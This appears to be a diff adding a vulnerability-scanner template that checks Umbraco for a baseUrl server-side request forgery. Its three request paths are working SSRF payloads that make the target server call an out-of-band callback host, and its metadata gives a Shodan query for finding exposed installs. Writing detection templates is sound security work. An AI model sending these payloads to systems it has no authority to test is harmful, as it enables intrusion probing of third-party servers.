@@ -1,0 +1,41 @@
+http:
+    - matchers:
+        - part: interactsh_protocol
+          type: word
+          words:
+            - http
+        - dsl:
+            - len(body_1)==0
+            - len(body_2)==0
+            - len(body_3)==0
+          type: dsl
+      matchers-condition: and
+      method: GET
+      path:
+        - '{{BaseURL}}/umbraco/BackOffice/Api/Help/GetContextHelpForPage?section=content&tree=undefined&baseUrl=http://{{interactsh-url}}'
+        - '{{BaseURL}}/umbraco/backoffice/UmbracoApi/Dashboard/GetRemoteDashboardContent?section=TryToAvoidGetCacheItem111&baseUrl=http://{{interactsh-url}}/'
+        - '{{BaseURL}}/umbraco/backoffice/UmbracoApi/Dashboard/GetRemoteDashboardCss?section=AvoidGetCacheItem&baseUrl=http://{{interactsh-url}}/'
+      req-condition: true
+      stop-at-first-match: true
+id: umbraco-base-ssrf
+info:
+    author: dhiyaneshDk
+    classification:
+        cvss-metrics: CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:N/A:N
+        cvss-score: 6.8
+        cwe-id: CWE-918
+    description: Umbraco 8.1.4.1 allows attackers to use the baseUrl parameter to several programs to perform a server-side request forgery (SSRF) attack.
+    metadata:
+        max-request: 3
+        shodan-query: http.html:"Umbraco"
+        verified: true
+    name: Umbraco 8.14.1 - baseUrl Server-Side Request Forgery (SSRF)
+    reference:
+        - https://www.exploit-db.com/exploits/50462
+    severity: medium
+    tags:
+        - oast
+        - edb
+        - ssrf
+        - umbraco
+        - Umbraco
